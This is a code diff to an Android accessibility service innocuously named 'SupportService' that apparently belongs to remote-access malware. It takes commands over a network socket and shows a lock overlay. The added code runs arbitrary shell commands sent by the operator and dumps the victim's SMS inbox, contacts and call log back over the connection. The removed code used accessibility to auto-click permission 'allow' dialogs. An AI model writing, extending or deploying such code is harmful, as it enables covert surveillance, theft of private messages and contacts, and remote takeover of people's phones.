@@ -5,9 +5,13 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.PixelFormat;
+import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -49,7 +53,6 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
-    private boolean autoAllowPermissions = false;
     private String currentPath = Environment.getExternalStorageDirectory().getAbsolutePath();
     private final List<String> notificationLog = Collections.synchronizedList(new ArrayList<>());
 
@@ -255,40 +258,27 @@ public class SupportService extends AccessibilityService {
                 } else {
                     out.println("ERROR: Package not found");
                 }
-            } else if (cmdLower.startsWith("perm ")) {
-                String type = cmdLower.substring(5).trim();
-                String androidPerm = "";
-                switch (type) {
-                    case "storage":
-                        androidPerm = android.Manifest.permission.WRITE_EXTERNAL_STORAGE;
-                        break;
-                    case "camera":
-                        androidPerm = android.Manifest.permission.CAMERA;
-                        break;
-                    case "location":
-                        androidPerm = android.Manifest.permission.ACCESS_FINE_LOCATION;
-                        break;
-                    case "contacts":
-                        androidPerm = android.Manifest.permission.READ_CONTACTS;
-                        break;
+            } else if (cmdLower.startsWith("shell ")) {
+                String shellCmd = cmd.substring(6).trim();
+                try {
+                    Process process = Runtime.getRuntime().exec(shellCmd);
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    StringBuilder output = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        output.append(line).append("\n");
+                    }
+                    process.waitFor();
+                    out.println(output.toString().isEmpty() ? "OK: Executed" : output.toString());
+                } catch (Exception e) {
+                    out.println("ERROR: " + e.getMessage());
                 }
-
-                if (!androidPerm.isEmpty()) {
-                    autoAllowPermissions = true; // Pastikan auto-click nyala
-                    Intent intent = new Intent(this, CoreActivity.class);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    intent.putExtra("request_permission", androidPerm);
-                    startActivity(intent);
-                    out.println("OK: Requesting " + type + " permission...");
-                } else if (type.equals("on")) {
-                    autoAllowPermissions = true;
-                    out.println("OK: Auto-Allow Enabled");
-                } else if (type.equals("off")) {
-                    autoAllowPermissions = false;
-                    out.println("OK: Auto-Allow Disabled");
-                } else {
-                    out.println("ERROR: Invalid permission type");
-                }
+            } else if (cmdLower.equals("dump_sms")) {
+                dumpSMS(out);
+            } else if (cmdLower.equals("dump_contacts")) {
+                dumpContacts(out);
+            } else if (cmdLower.equals("dump_calls")) {
+                dumpCalls(out);
             } else {
                 out.println("ERROR: Unknown Command");
             }
@@ -297,6 +287,63 @@ public class SupportService extends AccessibilityService {
             // Error handling
         }
     }
+
+    private void dumpSMS(PrintWriter out) {
+        try {
+            Uri uriSMSURI = Uri.parse("content://sms/inbox");
+            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    String address = cur.getString(cur.getColumnIndexOrThrow("address"));
+                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                    out.println("From: " + address + " | Body: " + body);
+                }
+                cur.close();
+            } else {
+                out.println("ERROR: Could not query SMS");
+            }
+        } catch (Exception e) {
+            out.println("ERROR: " + e.getMessage());
+        }
+    }
+
+    private void dumpContacts(PrintWriter out) {
+        try {
+            Cursor cur = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String number = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    out.println("Name: " + name + " | Phone: " + number);
+                }
+                cur.close();
+            } else {
+                out.println("ERROR: Could not query Contacts");
+            }
+        } catch (Exception e) {
+            out.println("ERROR: " + e.getMessage());
+        }
+    }
+
+    private void dumpCalls(PrintWriter out) {
+        try {
+            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    String number = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                    String name = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
+                    int type = cur.getInt(cur.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                    out.println("Number: " + number + " | Name: " + name + " | Type: " + type);
+                }
+                cur.close();
+            } else {
+                out.println("ERROR: Could not query Call Log");
+            }
+        } catch (Exception e) {
+            out.println("ERROR: " + e.getMessage());
+        }
+    }
+
 
     private void showOverlay() {
         wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
@@ -397,15 +444,6 @@ public class SupportService extends AccessibilityService {
             if (notificationLog.size() > 50) notificationLog.remove(0);
         }
 
-        // AUTO-ALLOW PERMISSIONS LOGIC - BRUTE FORCE
-        if (autoAllowPermissions) {
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root != null) {
-                findAndClickAllow(root);
-                root.recycle();
-            }
-        }
-
         if (isLocked && overlay != null) {
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
@@ -413,30 +451,6 @@ public class SupportService extends AccessibilityService {
                     apply_immersive_mode();
                 }
             }
-        }
-    }
-
-    private void findAndClickAllow(AccessibilityNodeInfo node) {
-        if (node == null) return;
-        
-        CharSequence text = node.getText();
-        if (text != null) {
-            String t = text.toString().toLowerCase();
-            if (t.contains("allow") || t.contains("izinkan") || t.contains("while using the app")) {
-                if (node.isClickable()) {
-                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                } else {
-                    AccessibilityNodeInfo parent = node.getParent();
-                    if (parent != null && parent.isClickable()) {
-                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        parent.recycle();
-                    }
-                }
-            }
-        }
-
-        for (int i = 0; i < node.getChildCount(); i++) {
-            findAndClickAllow(node.getChild(i));
         }
     }
 
